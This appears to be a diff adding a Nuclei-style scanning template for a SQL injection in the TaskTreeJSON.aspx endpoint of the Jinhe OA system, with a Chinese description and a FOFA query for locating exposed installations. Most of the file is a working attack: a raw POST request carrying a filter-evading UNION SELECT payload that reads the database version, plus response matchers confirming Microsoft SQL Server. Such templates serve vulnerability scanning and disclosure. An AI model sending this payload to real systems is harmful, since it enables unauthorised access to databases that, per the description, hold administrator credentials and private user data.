@@ -1,0 +1,27 @@
+id: jinhe-oa-tasktreejson-sql
+
+info:
+  name: 金和OA系统TaskTreeJSON.aspx接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+      金和网络作为企业信息化解决方案提供商，其金和OA系统存在TaskTreeJSON.aspx接口未正确过滤用户输入参数的缺陷。攻击者可利用该SQL注入漏洞通过构造恶意请求，实现对后台数据库的敏感数据检索（包括但不限于管理员账号凭证、用户隐私数据等）。在特定权限条件下，该漏洞可能被进一步利用执行系统命令或部署恶意组件。该漏洞披露时间为2025-07-14，相关技术细节可参考官方安全公告。
+  tags: 金和OA
+
+http:
+- raw:
+  - |
+    POST /c6/Jhsoft.Web.dailytaskmanage/TaskTreeJSON.aspx/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    id='/**/UniOn/**/all/**/SelECt/**/NULL,@@verSion,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "Microsoft SQL Server"
